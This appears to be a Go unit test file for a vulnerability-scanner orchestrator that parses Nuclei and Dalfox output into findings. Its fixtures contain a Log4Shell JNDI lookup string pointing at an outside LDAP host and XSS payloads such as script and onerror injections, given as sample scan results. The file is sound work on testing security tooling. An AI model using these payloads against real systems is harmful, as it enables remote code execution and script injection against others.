package tools_test

import (
	"strings"
	"testing"

	"github.com/bbounty-pro/orchestrator/internal/tools"
)

const sampleNucleiJSONL = `{"template-id":"CVE-2021-44228","info":{"name":"Apache Log4j RCE","severity":"critical","description":"Log4Shell RCE","tags":["cve","rce","log4j"],"classification":{"cvss-score":10.0,"cvss-metrics":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"}},"host":"https://vulnerable.example.com","matched":"https://vulnerable.example.com/search?q=${jndi:ldap://x.x.x.x/a}","timestamp":"2024-01-15T10:30:00Z"}
{"template-id":"exposed-panel-grafana","info":{"name":"Grafana Panel Exposed","severity":"medium","tags":["panel","exposure"]},"host":"https://monitor.example.com","timestamp":"2024-01-15T10:31:00Z"}`

func TestParseNucleiOutput(t *testing.T) {
	r := strings.NewReader(sampleNucleiJSONL)
	findings, err := tools.ParseNucleiOutput(r, "test-scan-id", "nuclei")
	if err != nil {
		t.Fatalf("ParseNucleiOutput error: %v", err)
	}

	if len(findings) != 2 {
		t.Fatalf("expected 2 findings, got %d", len(findings))
	}

	// Check critical finding
	f := findings[0]
	if f.Severity != "critical" {
		t.Errorf("severity = %q, want critical", f.Severity)
	}
	if !strings.Contains(f.Title, "Log4j") {
		t.Errorf("title %q should contain Log4j", f.Title)
	}
	if f.CVSS == nil || *f.CVSS != 10.0 {
		t.Errorf("CVSS should be 10.0, got %v", f.CVSS)
	}
	if f.URL != "https://vulnerable.example.com/search?q=${jndi:ldap://x.x.x.x/a}" {
		t.Errorf("URL not set from matched field")
	}

	// Check medium finding
	f2 := findings[1]
	if f2.Severity != "medium" {
		t.Errorf("severity = %q, want medium", f2.Severity)
	}
	if f2.Category != "PANEL" && f2.Category != "EXPOSURE" {
		t.Logf("category = %q (acceptable)", f2.Category)
	}
}

func TestParseNucleiOutput_Empty(t *testing.T) {
	findings, err := tools.ParseNucleiOutput(strings.NewReader(""), "scan", "nuclei")
	if err != nil {
		t.Fatalf("unexpected error on empty input: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings on empty input, got %d", len(findings))
	}
}

func TestParseNucleiOutput_MixedContent(t *testing.T) {
	// Real nuclei output has progress lines mixed with JSON
	mixed := `[2024-01-15] nuclei v3.1.0
[INF] Running templates...
{"template-id":"test","info":{"name":"Test","severity":"high"},"host":"https://test.com","timestamp":"2024-01-15T10:00:00Z"}
[progress] 10/100 templates
{"template-id":"test2","info":{"name":"Test2","severity":"low"},"host":"https://test2.com","timestamp":"2024-01-15T10:01:00Z"}`

	findings, _ := tools.ParseNucleiOutput(strings.NewReader(mixed), "scan", "nuclei")
	if len(findings) != 2 {
		t.Errorf("expected 2 findings from mixed content, got %d", len(findings))
	}
}

const sampleDalfoxOutput = `[POC][G][BUILT-IN/dalfox-XSS-analysis] https://xss.example.com/search?q=<script>alert(1)</script>
[VULN][Dalfox] https://xss.example.com/comment?body="><img src=x onerror=alert(1)>`

func TestParseDalfoxOutput(t *testing.T) {
	findings, err := tools.ParseDalfoxOutput(strings.NewReader(sampleDalfoxOutput), "scan", "dalfox")
	if err != nil {
		t.Fatalf("ParseDalfoxOutput error: %v", err)
	}
	if len(findings) < 1 {
		t.Errorf("expected at least 1 XSS finding, got %d", len(findings))
	}
	for _, f := range findings {
		if f.Category != "XSS" {
			t.Errorf("expected XSS category, got %q", f.Category)
		}
		if f.Severity != "high" {
			t.Errorf("XSS should be high severity, got %q", f.Severity)
		}
	}
}

func TestParseDispatch(t *testing.T) {
	tests := []struct {
		toolID string
		input  string
		wantN  int
	}{
		{"nuclei", `{"template-id":"test","info":{"name":"T","severity":"high"},"host":"https://test.com","timestamp":"2024-01-01T00:00:00Z"}`, 1},
		{"dalfox", `[POC] https://test.com/xss`, 1},
		{"unknown-tool", `SQL syntax error found at https://test.com`, 1},
	}

	for _, tt := range tests {
		t.Run(tt.toolID, func(t *testing.T) {
			findings, err := tools.Parse(tt.toolID, strings.NewReader(tt.input), "scan-test")
			if err != nil {
				t.Fatalf("%s: unexpected error: %v", tt.toolID, err)
			}
			if len(findings) < tt.wantN {
				t.Errorf("%s: expected >= %d findings, got %d", tt.toolID, tt.wantN, len(findings))
			}
		})
	}
}
